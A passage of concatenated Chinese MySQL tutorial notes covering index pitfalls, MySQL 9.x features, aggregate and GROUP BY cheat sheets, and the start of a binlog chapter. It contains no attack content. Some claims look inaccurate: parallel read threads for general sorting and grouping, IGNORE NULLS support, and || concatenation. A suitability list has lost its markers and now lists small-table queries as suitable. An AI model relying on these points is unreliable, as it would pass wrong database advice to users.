-- 改写为范围查询以利用索引
SELECT * FROM users WHERE created_at >= '2024-01-01' AND created_at < '2024-01-02';
```

**单行写法：隐式类型转换导致索引失效**
`WHERE <列名> = <不同类型值>`
```sql
-- 字符串列与数字比较导致索引失效
SELECT * FROM users WHERE phone = 13800138000;
```

**单行写法：使用正确类型利用索引**
`WHERE <列名> = '<字符串值>'`
```sql
-- 使用字符串值以利用索引
SELECT * FROM users WHERE phone = '13800138000';
```

**单行写法：LIKE 前置通配符导致索引失效**
`WHERE <列名> LIKE '%<模式>'`
```sql
-- 前置通配符导致索引失效
SELECT * FROM users WHERE username LIKE '%张';
```

**单行写法：LIKE 后置通配符利用索引**
`WHERE <列名> LIKE '<前缀>%'`
```sql
-- 后置通配符能利用索引
SELECT * FROM users WHERE username LIKE '张%';
```

<!-- ============ 文档分隔线：020-mysql/056-MySQL9NewFeaturesParallelQuery.md ============ -->

## 1. MySQL 9.x 概述

MySQL 9.x 是 MySQL 数据库的最新主要版本，引入了大量面向现代应用场景的特性，包括 AI 向量搜索支持、JSON 功能增强、查询优化器改进和并行查询能力提升。本章系统梳理 MySQL 9.x 的核心新特性及并行查询机制。

### 1.1 版本演进路线

| 版本      | 发布时间 | 核心特性                                   |
| :-------- | :------- | :----------------------------------------- |
| MySQL 8.0 | 2018     | 窗口函数、CTE、JSON增强、角色管理          |
| MySQL 8.4 | 2024     | LTS版本、性能改进、直方图增强              |
| MySQL 9.0 | 2024.7   | VECTOR类型、自动JSON模式验证、并行查询增强 |
| MySQL 9.x | 2025+    | 持续增强向量搜索、优化器改进               |

### 1.2 MySQL 9.x 安装与版本确认

```sql
-- 查看当前版本
SELECT VERSION();

-- 查看支持的特性
SELECT * FROM performance_schema.global_variables
WHERE VARIABLE_NAME LIKE '%vector%';

-- 检查并行查询支持
SHOW VARIABLES LIKE '%parallel%';
```

## 2. VECTOR 向量类型

### 2.1 向量类型基础

MySQL 9.0 引入 `VECTOR` 数据类型，原生支持向量数据的存储与检索，为 AI/ML 应用场景（语义搜索、推荐系统、相似度匹配）提供数据库层面的支持。

```sql
-- 创建包含向量列的表
CREATE TABLE product_embeddings (
    product_id INT PRIMARY KEY,
    product_name VARCHAR(200),
    description TEXT,
    embedding VECTOR(768)   -- 768维向量（如 BERT 模型输出）
);

-- 插入向量数据（以 JSON 数组格式传入）
INSERT INTO product_embeddings VALUES (
    1,
    '无线蓝牙耳机',
    '高品质音效，降噪功能',
    '[0.123, -0.456, 0.789, ..., 0.012]'  -- 768维向量
);

-- 查询向量数据（返回 JSON 数组格式）
SELECT product_id, product_name,
       VECTOR_TO_STRING(embedding) AS embedding_str
FROM product_embeddings;
```

### 2.2 向量距离函数

```sql
-- 欧几里得距离（L2距离）
SELECT product_id, product_name,
       DISTANCE(embedding, '[0.1, -0.5, 0.8, ...]') AS distance
FROM product_embeddings
ORDER BY distance ASC
LIMIT 10;

-- 余弦相似度
SELECT product_id, product_name,
       1 - DISTANCE(embedding, '[0.1, -0.5, 0.8, ...]', 'COSINE') AS similarity
FROM product_embeddings
ORDER BY similarity DESC
LIMIT 10;

-- 内积（点积）
SELECT product_id, product_name,
       DISTANCE(embedding, '[0.1, -0.5, 0.8, ...]', 'DOT') AS dot_product
FROM product_embeddings
ORDER BY dot_product DESC
LIMIT 10;
```

### 2.3 向量索引

```sql
-- 创建向量索引以加速近似最近邻搜索
ALTER TABLE product_embeddings
ADD VECTOR INDEX idx_embedding (embedding)
WITH (DISTANCE = 'COSINE', M = 16, EF_CONSTRUCTION = 256);

-- 使用向量索引的近似搜索
SELECT product_id, product_name,
       1 - DISTANCE(embedding, '[0.1, -0.5, 0.8, ...]', 'COSINE') AS similarity
FROM product_embeddings
ORDER BY similarity DESC
LIMIT 20;

-- 查看向量索引信息
SELECT * FROM information_schema.VECTOR_INDEXES
WHERE TABLE_NAME = 'product_embeddings';
```

### 2.4 向量类型应用场景

```sql
-- 语义搜索：查找与查询文本语义相似的商品
CREATE TABLE search_cache (
    query_hash VARCHAR(64) PRIMARY KEY,
    query_text TEXT,
    query_embedding VECTOR(768),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- 推荐系统：基于用户偏好向量推荐商品
CREATE TABLE user_profiles (
    user_id INT PRIMARY KEY,
    preference_vector VECTOR(256),
    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
);

-- 相似度匹配：图像特征向量检索
CREATE TABLE image_features (
    image_id BIGINT PRIMARY KEY,
    feature_vector VECTOR(512),
    image_url VARCHAR(500)
);
```

## 3. JSON 功能增强

### 3.1 自动 JSON 模式验证

MySQL 9.0 支持为 JSON 列定义 JSON Schema，自动验证插入和更新的 JSON 数据是否符合预定义的结构。

```sql
-- 创建带 JSON Schema 验证的表
CREATE TABLE user_profiles (
    id INT PRIMARY KEY AUTO_INCREMENT,
    profile JSON,
    CHECK (
        JSON_SCHEMA_VALID(
            '{
                "type": "object",
                "required": ["name", "email"],
                "properties": {
                    "name": {"type": "string", "minLength": 1},
                    "email": {"type": "string", "format": "email"},
                    "age": {"type": "integer", "minimum": 0, "maximum": 150},
                    "tags": {
                        "type": "array",
                        "items": {"type": "string"}
                    }
                }
            }',
            profile
        )
    )
);

-- 合法数据：包含必填字段且类型正确
INSERT INTO user_profiles (profile) VALUES (
    '{"name": "张三", "email": "zhang@example.com", "age": 28, "tags": ["vip"]}'
);

-- 非法数据：缺少必填字段 → 报错
INSERT INTO user_profiles (profile) VALUES (
    '{"name": "李四"}'
);
-- ERROR: Check constraint failed

-- 非法数据：类型不匹配 → 报错
INSERT INTO user_profiles (profile) VALUES (
    '{"name": "王五", "email": "wang@example.com", "age": "not_a_number"}'
);
```

### 3.2 JSON 聚合函数

```sql
-- JSON_ARRAYAGG：将多行值聚合为 JSON 数组
SELECT department,
       JSON_ARRAYAGG(JSON_OBJECT('name', name, 'salary', salary)) AS employees
FROM employees
GROUP BY department;

-- JSON_OBJECTAGG：将键值对聚合为 JSON 对象
SELECT department,
       JSON_OBJECTAGG(name, salary) AS salary_map
FROM employees
GROUP BY department;

-- MySQL 9.x 增强的 JSON_TABLE 嵌套路径
SELECT jt.*
FROM orders,
     JSON_TABLE(
         order_items,
         '$[*]' COLUMNS(
             item_id VARCHAR(20) PATH '$.id',
             quantity INT PATH '$.qty',
             NESTED PATH '$.details[*]' COLUMNS(
                 detail_name VARCHAR(50) PATH '$.name',
                 detail_value VARCHAR(100) PATH '$.value'
             )
         )
     ) AS jt;
```

### 3.3 JSON 空间优化

```sql
-- MySQL 9.x 对 JSON 存储进行了优化
-- JSON 列的存储更紧凑，部分更新不再重写整个 JSON 文档

-- 查看表的 JSON 列信息
SELECT TABLE_NAME, COLUMN_NAME, COLUMN_TYPE
FROM information_schema.COLUMNS
WHERE DATA_TYPE = 'json'
AND TABLE_SCHEMA = 'your_database';

-- JSON 部分更新（in-place update）
UPDATE user_profiles
SET profile = JSON_SET(profile, '$.age', 29)
WHERE id = 1;
-- 如果修改的字段大小未超出原值，可原地更新，避免重写整个 JSON
```

## 4. 窗口函数完善

### 4.1 MySQL 9.x 窗口函数增强

```sql
-- 窗口函数中的 IGNORE NULLS 支持
SELECT
    employee_id,
    department,
    salary,
    FIRST_VALUE(salary) IGNORE NULLS OVER (
        PARTITION BY department ORDER BY hire_date
    ) AS first_salary,
    LAST_VALUE(salary) IGNORE NULLS OVER (
        PARTITION BY department ORDER BY hire_date
        ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING
    ) AS last_salary
FROM employees;

-- 增强的 NTILE 函数
SELECT
    product_id,
    category,
    price,
    NTILE(4) OVER (PARTITION BY category ORDER BY price) AS price_quartile
FROM products;

-- 增强的 GROUPS 窗口帧
SELECT
    order_date,
    amount,
    SUM(amount) OVER (
        ORDER BY order_date
        GROUPS BETWEEN 1 PRECEDING AND 1 FOLLOWING
    ) AS moving_sum
FROM daily_sales;
```

### 4.2 窗口函数性能优化

```sql
-- 使用窗口函数替代自连接，提升性能
-- 旧写法：自连接
SELECT e1.employee_id, e1.salary,
       (SELECT AVG(e2.salary)
        FROM employees e2
        WHERE e2.department = e1.department) AS dept_avg
FROM employees e1;

-- 新写法：窗口函数（更高效）
SELECT
    employee_id,
    department,
    salary,
    AVG(salary) OVER (PARTITION BY department) AS dept_avg,
    salary - AVG(salary) OVER (PARTITION BY department) AS diff_from_avg
FROM employees;
```

## 5. CTE 与递归查询

### 5.1 通用表表达式 (CTE)

```sql
-- 非递归 CTE：简化复杂查询
WITH monthly_revenue AS (
    SELECT
        DATE_FORMAT(order_date, '%Y-%m') AS month,
        SUM(amount) AS revenue,
        COUNT(*) AS order_count
    FROM orders
    WHERE status = 'completed'
    GROUP BY month
),
monthly_avg AS (
    SELECT AVG(revenue) AS avg_revenue FROM monthly_revenue
)
SELECT
    m.month,
    m.revenue,
    m.order_count,
    a.avg_revenue,
    ROUND((m.revenue - a.avg_revenue) / a.avg_revenue * 100, 2) AS pct_diff
FROM monthly_revenue m
CROSS JOIN monthly_avg a
ORDER BY m.month;
```

### 5.2 递归 CTE

```sql
-- 组织架构层级查询
WITH RECURSIVE org_hierarchy AS (
    -- 锚点查询：顶级管理者
    SELECT
        employee_id,
        name,
        manager_id,
        1 AS level,
        CAST(name AS CHAR(500)) AS path
    FROM employees
    WHERE manager_id IS NULL

    UNION ALL

    -- 递归查询：逐级展开
    SELECT
        e.employee_id,
        e.name,
        e.manager_id,
        h.level + 1 AS level,
        CONCAT(h.path, ' → ', e.name) AS path
    FROM employees e
    INNER JOIN org_hierarchy h ON e.manager_id = h.employee_id
)
SELECT * FROM org_hierarchy ORDER BY level, path;

-- 物料清单 (BOM) 展开
WITH RECURSIVE bom AS (
    SELECT
        parent_part,
        child_part,
        quantity,
        1 AS level
    FROM parts_relation
    WHERE parent_part = 'PRODUCT-A'

    UNION ALL

    SELECT
        p.parent_part,
        p.child_part,
        p.quantity,
        b.level + 1
    FROM parts_relation p
    INNER JOIN bom b ON p.parent_part = b.child_part
)
SELECT
    level,
    parent_part,
    child_part,
    quantity,
    RPAD('', level * 2, '  ') || child_part AS indented_name
FROM bom
ORDER BY level, parent_part;
```

### 5.3 递归 CTE 注意事项

```sql
-- 设置递归深度限制（防止无限递归）
SET cte_max_recursion_depth = 1000;  -- 默认1000

-- 使用 LIMIT 控制递归层级
WITH RECURSIVE tree AS (
    SELECT id, parent_id, name, 1 AS lvl
    FROM categories WHERE parent_id IS NULL
    UNION ALL
    SELECT c.id, c.parent_id, c.name, t.lvl + 1
    FROM categories c JOIN tree t ON c.parent_id = t.id
    WHERE t.lvl < 5  -- 限制最大5层
)
SELECT * FROM tree;
```

## 6. 函数索引与不可见索引

### 6.1 函数索引

MySQL 8.0+ 支持基于函数表达式的索引，解决列上函数运算导致索引失效的问题。

```sql
-- 传统方式：WHERE 条件中使用函数导致索引失效
SELECT * FROM users WHERE YEAR(created_at) = 2024;
-- 无法使用 created_at 上的索引

-- 函数索引：为函数表达式创建索引
CREATE INDEX idx_year ON users ((YEAR(created_at)));
SELECT * FROM users WHERE YEAR(created_at) = 2024;
-- 可以使用 idx_year 索引

-- 常用函数索引场景
-- 大小写不敏感查询
CREATE INDEX idx_lower_name ON users ((LOWER(name)));
SELECT * FROM users WHERE LOWER(name) = 'zhang san';

-- JSON 字段索引
CREATE INDEX idx_json_age ON user_profiles ((CAST(profile->'$.age' AS UNSIGNED)));
SELECT * FROM user_profiles WHERE CAST(profile->'$.age' AS UNSIGNED) > 25;

-- 计算列索引
CREATE INDEX idx_full_name ON employees ((CONCAT(first_name, ' ', last_name)));
SELECT * FROM employees WHERE CONCAT(first_name, ' ', last_name) = 'Zhang San';
```

### 6.2 不可见索引

不可见索引不会被优化器使用，但仍然维护更新，用于安全地测试删除索引的影响。

```sql
-- 创建不可见索引
CREATE INDEX idx_status ON orders(status) INVISIBLE;

-- 将已有索引设为不可见
ALTER TABLE orders ALTER INDEX idx_status SET INVISIBLE;

-- 恢复可见
ALTER TABLE orders ALTER INDEX idx_status SET VISIBLE;

-- 会话级别强制使用不可见索引（仅用于测试）
SET SESSION optimizer_switch = 'use_invisible_indexes=on';

-- 验证索引是否被使用
EXPLAIN SELECT * FROM orders WHERE status = 'shipped';
-- 不可见索引不会出现在执行计划中
```

## 7. 直方图统计

### 7.1 直方图基础

直方图提供列值分布的统计信息，帮助优化器在索引不可用时做出更好的执行计划选择。

```sql
-- 创建直方图
ANALYZE TABLE orders UPDATE HISTOGRAM ON status, customer_id WITH 100 BUCKETS;

-- 查看直方图信息
SELECT TABLE_NAME, COLUMN_NAME, HISTOGRAM
FROM information_schema.COLUMN_STATISTICS
WHERE TABLE_SCHEMA = 'your_database';

-- 删除直方图
ANALYZE TABLE orders DROP HISTOGRAM ON status;

-- 查看直方图详细内容
SELECT JSON_PRETTY(HISTOGRAM) AS histogram_detail
FROM information_schema.COLUMN_STATISTICS
WHERE TABLE_NAME = 'orders' AND COLUMN_NAME = 'status';
```

### 7.2 直方图适用场景

```sql
-- 场景1：低基数列的选择性评估
-- status 列只有几个值，直方图帮助优化器判断过滤性
ANALYZE TABLE orders UPDATE HISTOGRAM ON status WITH 10 BUCKETS;

-- 场景2：关联查询的行数估算
-- 无索引的关联列，直方图改善估算精度
ANALYZE TABLE order_items UPDATE HISTOGRAM ON product_id WITH 256 BUCKETS;

-- 场景3：范围查询的选择性
-- 价格范围查询，直方图帮助估算匹配行数
ANALYZE TABLE products UPDATE HISTOGRAM ON price WITH 100 BUCKETS;

-- 对比执行计划
EXPLAIN FORMAT=JSON
SELECT * FROM orders WHERE status = 'shipped';
-- 查看 "filtered" 字段，直方图可改善此估算值
```

## 8. 并行查询

### 8.1 InnoDB 并行读线程

MySQL 9.x 增强了 InnoDB 的并行读取能力，利用多线程并行扫描大表，显著提升全表扫描和范围查询的性能。

```sql
-- 配置并行读线程数
SET SESSION innodb_parallel_read_threads = 4;  -- 默认4，最大256

-- 并行扫描大表
SET innodb_parallel_read_threads = 8;
SELECT COUNT(*) FROM large_table;  -- 使用8个线程并行扫描

-- 并行范围查询
SET innodb_parallel_read_threads = 4;
SELECT SUM(amount) FROM orders
WHERE order_date BETWEEN '2024-01-01' AND '2024-12-31';
```

### 8.2 并行排序

```sql
-- 大结果集的 ORDER BY 可利用并行排序
SET SESSION innodb_parallel_read_threads = 4;

-- 并行排序 + LIMIT
SELECT * FROM large_table
ORDER BY created_at DESC
LIMIT 1000;

-- 并行排序 + 聚合
SELECT category, AVG(price) AS avg_price
FROM products
GROUP BY category
ORDER BY avg_price DESC;
```

### 8.3 并行索引扫描

```sql
-- 并行索引范围扫描
SET SESSION innodb_parallel_read_threads = 4;

SELECT * FROM orders
FORCE INDEX (idx_order_date)
WHERE order_date BETWEEN '2024-01-01' AND '2024-06-30'
ORDER BY order_date;

-- 并行覆盖索引扫描
SELECT customer_id, COUNT(*) AS order_count
FROM orders
FORCE INDEX (idx_customer_date)
WHERE order_date >= '2024-01-01'
GROUP BY customer_id
ORDER BY order_count DESC;
```

### 8.4 并行 GROUP BY 优化

```sql
-- 并行聚合查询
SET SESSION innodb_parallel_read_threads = 8;

-- 大表分组聚合
SELECT
    DATE_FORMAT(order_date, '%Y-%m') AS month,
    region,
    COUNT(*) AS order_count,
    SUM(amount) AS total_amount,
    AVG(amount) AS avg_amount
FROM orders
WHERE order_date >= '2024-01-01'
GROUP BY month, region
ORDER BY month, total_amount DESC;

-- 并行 DISTINCT
SELECT DISTINCT category FROM large_product_table;
```

### 8.5 并行查询监控与调优

```sql
-- 查看并行查询执行信息
EXPLAIN FORMAT=TREE
SELECT COUNT(*) FROM large_table;
-- 输出中会显示 "parallel" 相关信息

-- 监控并行线程使用
SELECT * FROM performance_schema.threads
WHERE NAME LIKE '%parallel%';

-- 并行查询参数调优
SET GLOBAL innodb_parallel_read_threads = 8;        -- 全局默认并行线程数
SET SESSION innodb_parallel_read_threads = 16;      -- 会话级别覆盖

-- 并行查询适用场景
--  大表全表扫描
--  大范围索引扫描
--  聚合查询（COUNT/SUM/AVG）
--  排序查询
--  小表查询（并行开销大于收益）
--  高并发 OLTP（线程资源有限）
--  包含子查询的复杂查询
```

## 9. 其他 MySQL 9.x 新特性

### 9.1 性能改进

```sql
-- 改进的查询优化器
-- 优化器现在能更好地处理 OR 条件
SELECT * FROM orders
WHERE customer_id = 1001 OR status = 'urgent';
-- 9.x 可能使用 index merge 优化

-- EXPLAIN ANALYZE（实际执行并返回耗时）
EXPLAIN ANALYZE
SELECT * FROM orders WHERE customer_id = 1001;
-- 返回实际执行时间、行数等信息
```

### 9.2 DDL 增强

```sql
-- 原子 DDL：DDL 操作要么完全成功，要么完全回滚
-- MySQL 8.0+ 支持，9.x 进一步增强
CREATE TABLE test_atomic (
    id INT PRIMARY KEY,
    name VARCHAR(100)
);
-- 如果创建失败，不会留下残留文件

-- 在线 DDL 改进
ALTER TABLE large_table
ADD COLUMN new_col VARCHAR(50),
ALGORITHM=INPLACE, LOCK=NONE;
-- 9.x 减少了在线 DDL 期间的锁等待
```

### 9.3 权限与安全增强

```sql
-- MySQL 9.0 默认使用 caching_sha2_password
-- 创建用户时指定认证插件
CREATE USER 'app_user'@'%'
IDENTIFIED WITH caching_sha2_password BY 'StrongP@ss123!';

-- 角色管理增强
CREATE ROLE 'read_only', 'read_write', 'admin';
GRANT SELECT ON app_db.* TO 'read_only';
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'read_write';
GRANT ALL ON app_db.* TO 'admin';

-- 将角色赋予用户
GRANT 'read_write' TO 'developer1'@'%';

-- 用户激活角色
SET ROLE 'read_write';

-- 设置默认角色
ALTER USER 'developer1'@'%' DEFAULT ROLE 'read_write';
```

<!-- ============ 文档分隔线：020-mysql/057-VectorType.md ============ -->

## 1. VECTOR 类型概述

MySQL 9.0 引入 VECTOR 类型，用于存储和检索高维向量，支持 AI/ML 应用中的嵌入向量搜索。

## 2. 创建向量列

```sql
-- 创建包含向量列的表
CREATE TABLE documents (
    id INT AUTO_INCREMENT PRIMARY KEY,
    content TEXT,
    embedding VECTOR(1536)  -- 1536维向量（OpenAI嵌入）
);

-- 插入向量数据
INSERT INTO documents (content, embedding) VALUES (
    'MySQL is a relational database',
    STRING_TO_VECTOR('[0.1, 0.2, 0.3, ...]')
);
```

## 3. 向量函数

### 3.1 距离计算

```sql
-- 欧几里得距离（L2距离）
SELECT id, content,
    DISTANCE(embedding, STRING_TO_VECTOR('[0.1, 0.2, ...]')) AS dist
FROM documents
ORDER BY dist ASC
LIMIT 10;

-- 余弦相似度
SELECT id, content,
    DISTANCE(embedding, STRING_TO_VECTOR('[0.1, 0.2, ...]'), 'COSINE') AS similarity
FROM documents
ORDER BY similarity DESC
LIMIT 10;
```

### 3.2 向量转换

```sql
-- 字符串转向量
SELECT STRING_TO_VECTOR('[0.1, 0.2, 0.3]');

-- 向量转字符串
SELECT VECTOR_TO_STRING(embedding) FROM documents LIMIT 1;
```

## 4. 向量索引

```sql
-- 创建向量索引（近似最近邻搜索）
ALTER TABLE documents ADD VECTOR INDEX idx_embedding (embedding)
    WITH (DISTANCE = 'COSINE', M = 16, EF_BUILD = 100);

-- 使用向量索引搜索
SELECT id, content,
    DISTANCE(embedding, STRING_TO_VECTOR('[0.1, 0.2, ...]'), 'COSINE') AS dist
FROM documents
ORDER BY dist ASC
LIMIT 10;
-- 自动使用向量索引加速
```

## 5. 应用场景

```sql
-- 语义搜索
-- 1. 使用嵌入模型生成查询向量
-- 2. 在数据库中搜索最近邻向量
-- 3. 返回语义相关的文档

-- 推荐系统
-- 1. 用户偏好向量化
-- 2. 商品特征向量化
-- 3. 基于向量相似度推荐

-- 图像搜索
-- 1. 图像特征提取为向量
-- 2. 基于向量距离搜索相似图像
```

<!-- ============ 文档分隔线：020-mysql/058-JSONSchemaValidationAggregate.md ============ -->

## 1. JSON 模式验证

### 1.1 JSON_SCHEMA_VALID

```sql
-- 定义 JSON Schema
SET @schema = '{
    "type": "object",
    "required": ["name", "age"],
    "properties": {
        "name": {"type": "string", "minLength": 1},
        "age": {"type": "integer", "minimum": 0},
        "email": {"type": "string", "format": "email"}
    }
}';

-- 验证 JSON 数据
SELECT JSON_SCHEMA_VALID(@schema, '{"name": "Alice", "age": 30}');
-- 返回 1（有效）

SELECT JSON_SCHEMA_VALID(@schema, '{"name": "Bob"}');
-- 返回 0（缺少 age）

-- 在 CHECK 约束中使用
CREATE TABLE users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    data JSON,
    CHECK (JSON_SCHEMA_VALID('{
        "type": "object",
        "required": ["name"],
        "properties": {"name": {"type": "string"}}
    }', data))
);
```

### 1.2 JSON_SCHEMA_VALIDATION_REPORT

```sql
-- 获取详细的验证报告
SELECT JSON_SCHEMA_VALIDATION_REPORT(@schema, '{"name": "Bob"}');
-- 返回验证失败的详细信息
```

## 2. JSON 聚合函数

### 2.1 JSON_ARRAYAGG

```sql
-- 将多行的值聚合为 JSON 数组
SELECT dept_id, JSON_ARRAYAGG(name) AS employee_names
FROM employees
GROUP BY dept_id;

-- 结果：
-- dept_id | employee_names
-- 1       | ["Alice", "Bob", "Charlie"]
-- 2       | ["David", "Eve"]
```

### 2.2 JSON_OBJECTAGG

```sql
-- 将键值对聚合为 JSON 对象
SELECT dept_id, JSON_OBJECTAGG(name, salary) AS salary_map
FROM employees
GROUP BY dept_id;

-- 结果：
-- dept_id | salary_map
-- 1       | {"Alice": 50000, "Bob": 60000, "Charlie": 55000}
```

## 3. JSON 表函数

### 3.1 JSON_TABLE

```sql
-- 将 JSON 数组展开为关系表
SELECT jt.*
FROM orders,
JSON_TABLE(items, '$[*]' COLUMNS (
    product_id INT PATH '$.product_id',
    quantity INT PATH '$.quantity',
    price DECIMAL(10,2) PATH '$.price'
)) AS jt;

-- 嵌套列
SELECT jt.name, jt.street, jt.city
FROM users,
JSON_TABLE(address, '$' COLUMNS (
    name VARCHAR(100) PATH '$.name',
    NESTED PATH '$.address' COLUMNS (
        street VARCHAR(200) PATH '$.street',
        city VARCHAR(100) PATH '$.city'
    )
)) AS jt;
```
## 聚合函数

**单行写法：COUNT 计数**
`SELECT COUNT(<列>) FROM <表名>;`
```sql
-- 统计用户总数
SELECT COUNT(*) AS total FROM users;
```

**单行写法：COUNT 去重计数**
`SELECT COUNT(DISTINCT <列>) FROM <表名>;`
```sql
-- 统计不重复的城市数量
SELECT COUNT(DISTINCT city) FROM users;
```

**单行写法：SUM 求和**
`SELECT SUM(<列>) FROM <表名>;`
```sql
-- 统计所有订单总金额
SELECT SUM(total_amount) AS total FROM orders;
```

**单行写法：AVG 平均值**
`SELECT AVG(<列>) FROM <表名>;`
```sql
-- 计算用户平均年龄
SELECT AVG(age) AS avg_age FROM users;
```

**单行写法：MAX 最大值**
`SELECT MAX(<列>) FROM <表名>;`
```sql
-- 查询最高订单金额
SELECT MAX(total_amount) AS max_amount FROM orders;
```

**单行写法：MIN 最小值**
`SELECT MIN(<列>) FROM <表名>;`
```sql
-- 查询最低订单金额
SELECT MIN(total_amount) AS min_amount FROM orders;
```

**单行写法：GROUP_CONCAT 分组拼接**
`SELECT GROUP_CONCAT(<列> SEPARATOR '<分隔符>') FROM <表名>;`
```sql
-- 拼接用户名用逗号分隔
SELECT GROUP_CONCAT(username SEPARATOR ',') FROM users;
```

**单行写法：BIT_COUNT 位计数**
`SELECT BIT_COUNT(<列>) FROM <表名>;`
```sql
-- 统计二进制位中 1 的个数
SELECT BIT_COUNT(flags) FROM users;
```

---

## GROUP BY 分组

**换行写法：单列分组**
`SELECT <列>, <聚合函数> FROM <表名> GROUP BY <列>;`
```sql
-- 按状态分组统计用户数
SELECT status, COUNT(*) AS count FROM users GROUP BY status;
```

**换行写法：多列分组**
`SELECT <列1>, <列2>, <聚合> FROM <表名> GROUP BY <列1>, <列2>;`
```sql
-- 按城市和性别分组统计
SELECT city, gender, COUNT(*) AS count FROM users GROUP BY city, gender;
```

**换行写法：按表达式分组**
`SELECT <表达式>, <聚合> FROM <表名> GROUP BY <表达式>;`
```sql
-- 按月份分组统计订单
SELECT DATE_FORMAT(created_at, '%Y-%m') AS month, COUNT(*) AS orders
FROM orders
GROUP BY month;
```

**换行写法：按日期分组**
`SELECT DATE(<列>), <聚合> FROM <表名> GROUP BY DATE(<列>);`
```sql
-- 按天统计订单数量
SELECT DATE(created_at) AS day, COUNT(*) AS cnt
FROM orders
GROUP BY DATE(created_at);
```

---

## HAVING 过滤分组

**换行写法：HAVING 过滤聚合结果**
`SELECT <列>, <聚合> FROM <表名> GROUP BY <列> HAVING <条件>;`
```sql
-- 查询订单数超过 5 的用户
SELECT user_id, COUNT(*) AS cnt FROM orders GROUP BY user_id HAVING cnt > 5;
```

**换行写法：HAVING 多条件**
`SELECT <列>, <聚合> FROM <表名> GROUP BY <列> HAVING <条件1> AND <条件2>;`
```sql
-- 查询订单数大于 5 且总金额大于 1000 的用户
SELECT user_id, COUNT(*) AS cnt, SUM(total_amount) AS total
FROM orders
GROUP BY user_id
HAVING cnt > 5 AND total > 1000;
```

**换行写法：WHERE 与 HAVING 组合**
`SELECT <列>, <聚合> FROM <表名> WHERE <过滤条件> GROUP BY <列> HAVING <聚合条件>;`
```sql
-- 先过滤再分组再筛选
SELECT user_id, COUNT(*) AS cnt
FROM orders
WHERE status = 1
GROUP BY user_id
HAVING cnt >= 3;
```

---

## WITH ROLLUP 汇总

**换行写法：分组小计与合计**
`SELECT <列>, <聚合> FROM <表名> GROUP BY <列> WITH ROLLUP;`
```sql
-- 按城市分组统计并显示总计
SELECT IFNULL(city, '总计') AS city, COUNT(*) AS cnt
FROM users
GROUP BY city WITH ROLLUP;
```

**换行写法：多列 ROLLUP 分层汇总**
`SELECT <列1>, <列2>, <聚合> FROM <表名> GROUP BY <列1>, <列2> WITH ROLLUP;`
```sql
-- 按城市和性别分层汇总
SELECT IFNULL(city, '总计') AS city, IFNULL(gender, '小计') AS gender, COUNT(*) AS cnt
FROM users
GROUP BY city, gender WITH ROLLUP;
```

---

## GROUP BY 排序与限制

**换行写法：分组后排序**
`SELECT <列>, <聚合> FROM <表名> GROUP BY <列> ORDER BY <聚合> DESC;`
```sql
-- 按订单数降序排列用户
SELECT user_id, COUNT(*) AS cnt FROM orders GROUP BY user_id ORDER BY cnt DESC;
```

**换行写法：分组排序并限制**
`SELECT <列>, <聚合> FROM <表名> GROUP BY <列> ORDER BY <聚合> DESC LIMIT <数量>;`
```sql
-- 查询订单数前 10 的用户
SELECT user_id, COUNT(*) AS cnt
FROM orders
GROUP BY user_id
ORDER BY cnt DESC
LIMIT 10;
```

---

## 窗口函数聚合（8.0+）

**换行写法：累计求和**
`SELECT <列>, SUM(<列>) OVER (ORDER BY <列>) FROM <表名>;`
```sql
-- 按日期累计求和销售额
SELECT order_date, amount,
  SUM(amount) OVER (ORDER BY order_date) AS cumulative
FROM daily_sales;
```

**换行写法：分组排名**
`SELECT <列>, ROW_NUMBER() OVER (PARTITION BY <列> ORDER BY <列>) FROM <表名>;`
```sql
-- 每个部门按薪资排名
SELECT name, dept_id, salary,
  ROW_NUMBER() OVER (PARTITION BY dept_id ORDER BY salary DESC) AS rn
FROM employees;
```

**换行写法：分组占比**
`SELECT <列>, <列> / SUM(<列>) OVER (PARTITION BY <列>) FROM <表名>;`
```sql
-- 计算每个用户订单金额占该用户总金额的比例
SELECT user_id, order_no, total_amount,
  total_amount / SUM(total_amount) OVER (PARTITION BY user_id) AS ratio
FROM orders;
```

<!-- ============ 文档分隔线：020-mysql/059-ReplicationHA.md ============ -->

## 1. 二进制日志 (Binary Log)

### 1.1 Binlog 概述

二进制日志记录所有对数据库进行修改的操作（DDL 和 DML），是 MySQL 复制和数据恢复的基础。Binlog 与 InnoDB 的 redo log 不同：redo log 是引擎级别的物理日志，而 binlog 是 Server 级别的逻辑日志。

```sql
-- 启用二进制日志
-- my.cnf 配置
-- [mysqld]
-- log-bin=mysql-bin
-- binlog_format=ROW
-- server-id=1
-- expire_logs_days=7

-- 查看二进制日志状态
SHOW VARIABLES LIKE 'log_bin%';
SHOW VARIABLES LIKE 'binlog%';

-- 查看当前二进制日志文件列表
SHOW BINARY LOGS;

-- 查看当前正在使用的 binlog 文件
SHOW MASTER STATUS;

-- 查看 binlog 事件内容
SHOW BINLOG EVENTS IN 'mysql-bin.000001';
```

### 1.2 Binlog 格式

| 格式      | 记录内容   | 优点             | 缺点                   |
| :-------- | :--------- | :--------------- | :--------------------- |
| STATEMENT | SQL 语句   | 日志量小         | 非确定性函数结果不一致 |
| ROW       | 行变更数据 | 数据一致性最高   | 日志量大               |
| MIXED     | 自动切换   | 兼顾大小与一致性 | 切换逻辑复杂           |

```sql
-- 设置 binlog 格式
SET GLOBAL binlog_format = 'ROW';     -- 推荐：数据一致性最好
SET GLOBAL binlog_format = 'STATEMENT';
SET GLOBAL binlog_format = 'MIXED';

-- STATEMENT 格式示例
-- binlog 中记录：UPDATE orders SET status='shipped' WHERE id=1;
-- 问题：NOW()、UUID()、USER() 等函数在主从上执行结果不同

-- ROW 格式示例
-- binlog 中记录：
-- ### UPDATE `app_db`.`orders`
-- ### WHERE @1=1 @5='pending'
-- ### SET @5='shipped'
-- 精确记录行变更，无一致性问题

-- 查看当前格式
SHOW VARIABLES LIKE 'binlog_format';
```

### 1.3 Binlog 管理

```sql
-- 手动切换到新的 binlog 文件
FLUSH BINARY LOGS;

-- 设置 binlog 过期时间（秒）
SET GLOBAL binlog_expire_logs_seconds = 604800;  -- 7天

-- 清理过期的 binlog
PURGE BINARY LOGS BEFORE '2024-12-01 00:00:00';
PURGE BINARY LOGS TO 'mysql-bin.000010';  -- 删除指定文件之前的日志

-- 查看 binlog 空间占用
